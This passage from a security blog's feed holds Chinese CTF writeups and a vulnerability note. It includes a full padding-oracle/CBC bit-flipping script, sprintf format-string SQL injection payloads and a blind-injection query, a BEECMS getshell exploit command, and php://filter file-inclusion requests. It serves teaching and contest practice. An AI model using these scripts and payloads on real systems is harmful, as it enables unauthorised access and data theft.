class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">	$password = $_POST[<span class="string">'password'</span>];</div><div class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</div><div class="line">  		get_identity();</div><div class="line">  		header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">  	&#125;<span class="keyword">else</span>&#123;</div><div class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</div><div class="line">  	&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">if</span>(test_identity())&#123;</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">        show_page();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>admin.php的源码后面放出。</p>
<p>经过测试，存在账号和密码，分别为admin和admin。在login.php页面登陆后会跳转到admin.php。默认情况下，由于并非真实admin，在跳转后会显示you are not admin.</p>
<h2 id="CBC翻转字节攻击"><a href="#CBC翻转字节攻击" class="headerlink" title="CBC翻转字节攻击"></a>CBC翻转字节攻击</h2><p>鉴于篇幅的原因，关于CBC翻转字节攻击这里就不多讲了。在观察login.php，以及加上一点点的社工后，可以发现跟NJCTF的某题神似。借<a href="http://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/" target="_blank" rel="external">网络的脚本</a>，修改了一下，增加登陆页面的验证以及跑出token后的结束标志：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">url=<span class="string">'http://111.231.111.54/login.php'</span></div><div class="line">N=<span class="number">16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_token</span><span class="params">(token)</span>:</span></div><div class="line">    header=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+phpsession+<span class="string">";token="</span>+token&#125;</div><div class="line">    result=requests.post(url,headers=header)</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></div><div class="line">    l=len(string)</div><div class="line">    <span class="keyword">if</span> l!=N:</div><div class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></div><div class="line">    get=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))</div><div class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</div><div class="line">            result=inject_token(base64.b64encode(c))</div><div class="line">            <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                get=chr(j^i)+get</div><div class="line">                <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> get</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(url)</span>:</span></div><div class="line">    payload = &#123;</div><div class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</div><div class="line">        <span class="string">"password"</span>:<span class="string">"admin"</span></div><div class="line">    &#125;</div><div class="line">    coo1 = &#123;</div><div class="line">        <span class="string">"PHPSESSID"</span>:<span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></div><div class="line">    &#125;</div><div class="line">    r = requests.post(url,cookies=coo1,data=payload,allow_redirects=<span class="keyword">False</span>)</div><div class="line">    token = r.headers[<span class="string">'Set-Cookie'</span>].replace(<span class="string">"%3D"</span>,<span class="string">'='</span>).replace(<span class="string">"%2F"</span>,<span class="string">'/'</span>).replace(<span class="string">"%2B"</span>,<span class="string">'+'</span>).decode(<span class="string">'base64'</span>)</div><div class="line">    session = <span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></div><div class="line">    <span class="keyword">return</span> session, token</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    phpsession,token = login(url)</div><div class="line"></div><div class="line">    middle1=padding_oracle(N)</div><div class="line">    <span class="keyword">print</span> middle1</div><div class="line">    <span class="keyword">print</span> <span class="string">"\n"</span></div><div class="line">    <span class="keyword">if</span>(len(middle1)+<span class="number">1</span>==<span class="number">16</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">            middle=chr(i)+middle1</div><div class="line">            <span class="keyword">print</span> <span class="string">"token:"</span>+token</div><div class="line">            <span class="keyword">print</span> <span class="string">"middle:"</span>+middle</div><div class="line">            plaintext=xor(middle,token);</div><div class="line">            <span class="keyword">print</span> <span class="string">"plaintext:"</span>+plaintext</div><div class="line">            des=pad(<span class="string">'admin'</span>,N)</div><div class="line">            tmp=<span class="string">""</span></div><div class="line">            <span class="keyword">print</span> des.encode(<span class="string">"base64"</span>)</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</div><div class="line">                tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))</div><div class="line">            <span class="keyword">print</span> tmp.encode(<span class="string">'base64'</span>)</div><div class="line">            result=inject_token(base64.b64encode(tmp))</div><div class="line">            <span class="comment"># print result.content</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"Login Form"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content <span class="keyword">and</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                <span class="keyword">print</span> result.content</div><div class="line">                <span class="keyword">print</span> <span class="string">"success"</span></div><div class="line">                exit()</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/6.png?raw=true" alt=""></p>
<p>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">token  HGV8cWwzDgk2CBooPRYtXA==</div><div class="line">PHPSESSID  j297k7o6d8stcbvi2c23naj5j6</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/7.png?raw=true" alt=""></p>
<p>成功进入后台。</p>
<h2 id="格式化串sql注入"><a href="#格式化串sql注入" class="headerlink" title="格式化串sql注入"></a>格式化串sql注入</h2><p>这里放上admin.php的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	$result = mysql_query($sql,$con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">		<span class="keyword">die</span>();</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在看到sprintf后，可以很直接的联系到前阵子爆出的关于wordpress的格式化字符串SQL注入漏洞。传送门：<a href="https://paper.seebug.org/386/" target="_blank" rel="external">从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新）</a></p>
<p>基于泄露出的源码，添加一些变量打印语句，本地测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$con = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	print_r(<span class="string">"GET[id] =&gt; "</span>.$_GET[<span class="string">'id'</span>].<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>],$con);</div><div class="line">	print_r(<span class="string">"\$id =&gt; "</span>.$id.<span class="string">"&lt;/br&gt;"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		print_r(<span class="string">"GET[title] =&gt; "</span>.$_GET[<span class="string">'title'</span>].<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		print_r(<span class="string">"escape string tile: \$title =&gt; "</span>.$title.<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">		print_r(<span class="string">"After first sprintf : \$title =&gt; "</span>.$title.<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	print_r(<span class="string">"sql =&gt; "</span>.$sql);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/index.php?id=1&amp;title=flag%1$&apos;%20 or 1=1%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/8.png?raw=true" alt=""></p>
<p>观察传入的title参数。</p>
<p>title传入的值为<code>flag%1$&#39; or 1=1#</code>，经过<code>mysql_real_escape_string</code>，会使得单引号<code>&#39;</code>前加上斜杠，也就是图片中的第四行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">escape string tile: $title =&gt; flag%1$\&apos; or 1=1#</div></pre></td></tr></table></figure></p>
<p>接下来执行一次<code>sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);</code>，也就是将前面得到的title值title值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">After first sprintf : $title =&gt; AND title=&apos;flag%1$\&apos; or 1=1#&apos;</div></pre></td></tr></table></figure></p>
<p>接下来，又一次执行了<code>sprintf</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id);</div></pre></td></tr></table></figure></p>
<p>由于PHP的sprintf中，<code>%1$\</code>这样的语法，百分号<code>%</code>后面的数表示使用第几个参数，<code>$</code>后面的表示类型，常见的类型比如<code>s</code>表示字符串等等。比如<code>%1$s</code>，表示使用第一个参数，类型为字符串（%s）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// 注format中，为防止 $ 被转义，在前面加了转义符。对于sprintf来说，即 %1$s</span></div><div class="line">$format1 = <span class="string">"hello,%1\$s one&lt;br/&gt;"</span>;</div><div class="line">$format2 = <span class="string">"hello,%2\$s two&lt;br/&gt;"</span>;</div><div class="line">$format3 = <span class="string">"hello,%1\$\' three&lt;br/&gt;"</span>;</div><div class="line">$format4 = <span class="string">"hello,%\$\' four&lt;br/&gt;"</span>;</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 1 : "</span>.$format1);</div><div class="line">print_r(<span class="string">"Result: "</span>.sprintf($format1,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 2 : "</span>.$format2);</div><div class="line">print_r(<span class="string">"Result: "</span>.sprintf($format2,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 3 : "</span>.$format3);</div><div class="line">print_r(sprintf($format3,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 4 : "</span>.$format4);</div><div class="line">print_r(sprintf($format4,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/17.png?raw=true" alt=""></p>
<p>前两个示例是演示选择参数的用法。第三个和前两个比较，变成类型<code>%\</code>，会直接跳过不处理，并直接输出。第四个和第三个对比，少了参数选择，这会导致报错，无法正常打印。</p>
<p>回到前面的sprintf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id);</div></pre></td></tr></table></figure></p>
<p>通过百分号后的1，选择了一个参数（即id）不会爆错。利用类型<code>%\</code>，使得跳过。而原本在<code>\</code>后面的单引号，由于前面斜杠被当作了sprintf的类型，得以成功逃逸。</p>
<p>剩下的工作就是盲注了，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://111.231.111.54/admin.php?id=1&amp;title=flag%1$&apos;%20 or (SELECT%09GROUP_CONCAT(f14g)%09FROM%09web1.key) &lt; 255 #</div></pre></td></tr></table></figure></p>
<p>脚本写得太丑，基于<a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/#CTF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">以前的写的框架</a>修改的，这里就不贴啦。</p>
<p>最后注出来的表结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">数据库：web1  </div><div class="line">表名:key  </div><div class="line">字段名:f14g</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/1.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LCTF&#123;N0!U_hacked_My_b1og&#125;</div></pre></td></tr></table></figure></p>
<p>回到PHP的sprintf中，sprintf能吃掉<code>\</code>呢？在<a href="https://github.com/php/php-src/blob/master/ext/standard/formatted_print.c#L643" target="_blank" rel="external">源码</a>中，采用了case进行分类处理，而对于未知情况，则采取break。明显<code>%\</code>是未知情况，因此成功绕过。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>源码泄露</li>
<li>CBC翻转字节攻击</li>
<li>格式化串sql注入</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;更新：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CBC翻转攻击脚本&lt;/li&gt;
&lt;li&gt;格式化字符串sql注入详细解答&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！&lt;/p&gt;
&lt;p&gt;LCTF 2017-Simple blog-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BEECMS v4.0_R_20160525 文件上传漏洞分析</title>
    <link href="http://chybeta.github.io/2017/11/14/BEECMS-v4-0-R-20160525-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/11/14/BEECMS-v4-0-R-20160525-文件上传漏洞分析/</id>
    <published>2017-11-14T05:12:50.000Z</published>
    <updated>2017-11-20T06:04:55.951Z</updated>
    
    <content type="html"><![CDATA[<p>其实这个洞早就出来了。<br>只不过几天前看到<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31579" target="_blank" rel="external">cnvd</a>上有人提交了。<br>漏洞利用过程挺好玩的，分析一波。</p>
<a id="more"></a>
<h1 id="漏洞复现：cmspoc"><a href="#漏洞复现：cmspoc" class="headerlink" title="漏洞复现：cmspoc:"></a>漏洞复现：<a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmspoc</a>:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -u http://vuln.com/index.php -t beecms -s v40_fileupload_gethshell.py</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171115/tty.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="变量覆盖进后台"><a href="#变量覆盖进后台" class="headerlink" title="变量覆盖进后台"></a>变量覆盖进后台</h2><h2 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实这个洞早就出来了。&lt;br&gt;只不过几天前看到&lt;a href=&quot;http://www.cnvd.org.cn/flaw/show/CNVD-2017-31579&quot;&gt;cnvd&lt;/a&gt;上有人提交了。&lt;br&gt;漏洞利用过程挺好玩的，分析一波。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>一道CTF题：PHP文件包含</title>
    <link href="http://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://chybeta.github.io/2017/11/09/一道CTF题：PHP文件包含/</id>
    <published>2017-11-09T12:10:14.000Z</published>
    <updated>2017-11-10T18:50:16.187Z</updated>
    
    <content type="html"><![CDATA[<p>今天在群里看到了几道题，这是其中之一。<br>PHP文件包含 Session</p>
<a id="more"></a>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/4.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h2><p>点击login，发现链接变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=login.php</div></pre></td></tr></table></figure></p>
<p>推测文件包含。</p>
<h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-encode/resource=login.php</div></pre></td></tr></table></figure></p>
<p>得到login.php源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require_once('config.php');</div><div class="line">	session_start();</div><div class="line">	if($_SESSION['username']) &#123;</div><div class="line">		header('Location: index.php');</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	if($_POST['username'] &amp;&amp; $_POST['password']) &#123;</div><div class="line">		$username = $_POST['username'];</div><div class="line">		$password = md5($_POST['password']);</div><div class="line"></div><div class="line">        $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);</div><div class="line"></div><div class="line">        if ($mysqli-&gt;connect_errno) &#123;</div><div class="line">            die("could not connect to the database:\n" . $mysqli-&gt;connect_error);</div><div class="line">        &#125;</div><div class="line">        $sql = "select password from user where username=?";</div><div class="line">        $stmt = $mysqli-&gt;prepare($sql);</div><div class="line">        $stmt-&gt;bind_param("s", $username);</div><div class="line">        $stmt-&gt;bind_result($res_password);</div><div class="line">        $stmt-&gt;execute();</div><div class="line"></div><div class="line">        $stmt-&gt;fetch();</div><div class="line">        if ($res_password == $password) &#123;</div><div class="line">            $_SESSION['username'] = base64_encode($username);</div><div class="line">            header("location:index.php");</div><div class="line">        &#125; else &#123;</div><div class="line">            die("Invalid user name or password");</div><div class="line">        &#125;</div><div class="line">        $stmt-&gt;close();</div><div class="line">        $mysqli-&gt;close();</div><div class="line">	&#125;</div><div class="line">	else &#123;</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">   &lt;title&gt;Login&lt;/title&gt;</div><div class="line">   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;</div><div class="line">   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;</div><div class="line">   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;div class="container" style="margin-top:100px"&gt;  </div><div class="line">		&lt;form action="login.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;</div><div class="line">			&lt;h3&gt;Login&lt;/h3&gt;</div><div class="line">			&lt;label&gt;Username:&lt;/label&gt;</div><div class="line">			&lt;input type="text" name="username" style="height:30px"class="span3"/&gt;</div><div class="line">			&lt;label&gt;Password:&lt;/label&gt;</div><div class="line">			&lt;input type="password" name="password" style="height:30px" class="span3"&gt;</div><div class="line"></div><div class="line">			&lt;button type="submit" class="btn btn-primary"&gt;LOGIN&lt;/button&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div 